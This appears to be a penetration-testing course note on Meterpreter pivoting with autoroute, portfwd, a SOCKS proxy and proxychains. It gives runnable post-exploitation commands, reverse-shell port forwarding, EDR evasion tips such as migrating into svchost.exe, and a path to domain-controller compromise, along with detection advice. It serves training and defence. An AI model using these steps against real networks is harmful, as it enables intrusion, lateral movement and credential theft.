---
topic: "73.06 Meterpreter Portfwd and Autoroute"
date: 2026-06-09
author: 'Antigravity'
tags: [network, advanced, pivoting, evasion, vapt]
difficulty: advanced
module: "73 - Advanced Network Pivoting Tunnels and Evasion"
---

# 73.06 Meterpreter Portfwd and Autoroute

## 1. Introduction to Meterpreter Pivoting
Once an attacker gains an initial foothold on a target network, the compromised machine is often used as a beachhead to explore deeper into the internal network. This process, known as pivoting, allows the attacker to bypass perimeter security controls (like firewalls and NAT) by routing their traffic through the established command and control (C2) session.
Metasploit's Meterpreter payload provides two highly effective, built-in utilities for network pivoting: `autoroute` and `portfwd`.
While both facilitate access to internal resources, they operate on completely different principles within the network stack. `autoroute` manipulates the Metasploit Framework's internal routing table to push layer-3 traffic through the session, whereas `portfwd` binds local listening ports and tunnels them layer-4 directly to specific remote sockets.
Mastering these tools is essential for advanced persistent threat (APT) emulation and complex penetration testing engagements.

## 2. Architectural Overview

### 2.1 Autoroute vs Portfwd
- **Autoroute**: Instructs the Metasploit Framework itself that any traffic destined for a specific subnet (e.g., 192.168.100.0/24) should be encapsulated within the Meterpreter protocol and sent down the active session. The compromised host then unwraps the packets and forwards them to the final destination on behalf of the attacker.
- **Portfwd**: Acts as a localized relay. It opens a port on the attacker's local machine (e.g., 8080). Any traffic sent to `localhost:8080` is tunneled through Meterpreter to the compromised host, which then forwards the connection to a hardcoded remote IP and port.

## 3. ASCII Diagram: The Pivot Architecture

```text
      [ Attacker (MSF Console) ]
      Local IP: 203.0.113.5
      MSF Route Table: 192.168.1.0/24 -> Session 1
             |
             | (Encrypted Meterpreter C2 Session over port 443)
             v
    +----------------------------------+
    | Compromised Host (The Pivot)     |
    | Public IP: 203.0.113.10          |
    | Internal IP: 192.168.1.50        |
    +----------------------------------+
             |
             | (Unencrypted Internal Traffic)
             |
      +------+------+------+------+
      |             |             |
 [ Target A ]  [ Target B ]  [ Target C ]
 192.168.1.10  192.168.1.11  192.168.1.12
  (Web App)     (SQL DB)      (Domain Ctrl)
```

## 4. Deep Dive: The Autoroute Module

### 4.1 Enumerating Subnets
Before routing, you must identify attached subnets on the compromised host. From within a Meterpreter session:
```bash
meterpreter> ipconfig
meterpreter> route
meterpreter> run get_local_subnets
```

### 4.2 Establishing the Route
To add a route within Metasploit:
```bash
# Using the post-exploitation module
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 192.168.1.0
msf6 post(multi/manage/autoroute) > run

# Alternatively, from within the meterpreter session directly:
meterpreter> run autoroute -s 192.168.1.0/24
```
Once the route is established, any Metasploit module executed against `192.168.1.x` will dynamically flow through Session 1.

### 4.3 Proxychains Integration
Autoroute only routes traffic generated *by the Metasploit Framework*. To route external tools (like Nmap, crackmapexec, or hydra), you must configure a SOCKS proxy.
```bash
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
```
Next, configure `/etc/proxychains4.conf`:
```text
[ProxyList]
socks5  127.0.0.1 1080
```
You can now run external tools:
```bash
proxychains nmap -sT -Pn -p 445 192.168.1.0/24
```
*(Note: ICMP and half-open SYN scans will not pass through SOCKS. Always use full TCP connect scans `-sT` and disable ping `-Pn`).*

## 5. Deep Dive: The Portfwd Module

### 5.1 Local Port Forwarding
Use local port forwarding when you want to access a single service on an internal machine.
```bash
# Forward local port 3389 to 192.168.1.10:3389 through the meterpreter session
meterpreter> portfwd add -l 3389 -p 3389 -r 192.168.1.10
```
You can now RDP to your own localhost, and the connection will be tunneled to the target.
```bash
xfreerdp /v:127.0.0.1:3389 /u:Administrator /p:Password123
```

### 5.2 Reverse Port Forwarding
Reverse port forwarding is crucial when catching a reverse shell from an internal machine that cannot route back to the internet, but *can* reach your compromised pivot host.
```bash
# Bind port 4444 on the compromised host, forward it to 4444 on your attacker machine
meterpreter> portfwd add -R -L 192.168.1.50 -l 4444 -p 4444
```
You would then configure your internal payload to connect to `192.168.1.50:4444`.

### 5.3 Managing Forwards
```bash
meterpreter> portfwd list
meterpreter> portfwd delete -l 3389
meterpreter> portfwd flush
```

## 6. Advanced Evasion and OpSec

### 6.1 Avoiding Detection via Meterpreter Tuning
Meterpreter traffic is highly scrutinized. To evade Next-Gen Firewalls (NGFW) and EDR solutions:
- Use `reverse_https` payloads instead of `reverse_tcp` to blend the tunnel into regular TLS traffic.
- Employ custom TLS certificates to avoid the default Metasploit SSL signatures.
- Modify the payload's `User-Agent` string.

### 6.2 Managing Traffic Surges
When running heavy scans through `autoroute`, the pivot host will generate a massive amount of network traffic originating from its interface.
- Implement scan delays in Nmap (`--scan-delay 100ms`).
- EDR solutions monitor for unexpected processes initiating large numbers of outbound connections. Ensure Meterpreter is migrated to a network-heavy process (like `svchost.exe` or `browser.exe`) before initiating the pivot.

## 7. Configuration Reference Guide

### 7.1 Optimal Proxychains Template
```text
# /etc/proxychains4.conf
# Strict chaining - passes traffic strictly through the listed proxies
strict_chain

# Quiet mode - reduces proxychains console noise
quiet_mode

# Proxy DNS requests - no DNS leaks
proxy_dns

# Timeout settings (crucial for slow meterpreter pivots)
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Standard Metasploit SOCKS5 default
socks5  127.0.0.1 1080
```

### 7.2 Post-Exploitation Routing Checklist
1. `getuid` -> Ensure adequate permissions.
2. `get_local_subnets` -> Identify targets.
3. `run autoroute -s [subnet]` -> Establish MSF route.
4. `route print` -> Verify MSF routing table.
5. `use auxiliary/server/socks_proxy` -> Start local SOCKS.
6. Verify `/etc/proxychains4.conf` -> Check SOCKS config.
7. `proxychains curl http://[internal_ip]` -> Test pivot.

## 8. Detection and Mitigation

### 8.1 Network Level Detection
- Inspect TLS traffic for known default Metasploit JARM/JA3 signatures if custom certs are not used.
- Monitor for workstation-to-workstation communication on unusual ports (e.g., 445, 3389), which often indicates lateral movement via a pivot.

### 8.2 Host Level Detection (EDR)
- Look for processes like `rundll32.exe`, `notepad.exe`, or `spoolsv.exe` suddenly binding high ephemeral ports or initiating thousands of outbound TCP handshakes (Nmap through SOCKS).
- Analyze memory for standard Meterpreter stagers (e.g., Reflective DLL injection remnants).

## 9. Chaining Opportunities
- **Active Directory Exploitation**: Once `autoroute` and `socks_proxy` are configured, use `proxychains` with `impacket` tools (like `secretsdump.py` or `wmiexec.py`) to compromise the internal domain controller.
- **Double Pivoting**: If you compromise a second host deep in the network, you can run `autoroute` again on *that* new session to access a third, deeper subnet, routing traffic through two chained Meterpreter sessions.

## 10. Related Notes
- [[07 - Socat Relays and Bind Shells]]
- [[11 - Proxychains and ProxyChains-NG]]
- [[12 - SSH Dynamic Port Forwarding]]
- [[15 - Impacket and Active Directory Lateral Movement]]
